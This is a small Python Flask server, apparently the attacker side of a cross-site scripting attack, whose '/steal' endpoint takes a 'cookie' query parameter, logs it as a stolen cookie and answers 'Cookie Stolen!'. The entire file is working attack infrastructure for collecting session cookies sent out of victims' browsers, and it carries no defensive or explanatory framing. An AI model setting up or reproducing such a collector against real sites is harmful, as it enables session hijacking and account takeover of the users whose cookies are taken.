from flask import Flask, request

app = Flask(__name__)

@app.route("/steal", methods=["GET"])
def steal():
    cookie = request.args.get("cookie")
    print(f"🔥 Stolen Cookie: {cookie}")  # Logs stolen cookies
    return "Cookie Stolen!"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8001)
